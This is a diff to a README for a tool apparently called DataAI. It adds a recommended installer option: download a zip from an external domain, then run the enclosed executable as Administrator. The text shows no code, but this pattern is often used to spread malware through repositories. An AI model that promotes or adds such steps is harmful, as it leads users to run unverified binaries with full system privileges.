@@ -35,6 +35,16 @@ Full license: https://www.gnu.org/licenses/gpl-3.0.html
 
 ## 🛠 Installation
 
+### Option 1 – Installer (Recommended)
+
+1. Download `InstallDataAI.zip` from DataAI.link
+2. Extract the archive
+3. Right-click `InstallDataAI.exe`
+4. Select **Run as Administrator**
+5. Follow the installer instructions
+
+### Option 2 – Manual Installation
+
 1. Download `DataAI.zip` from:
    http://DataAI.link
 
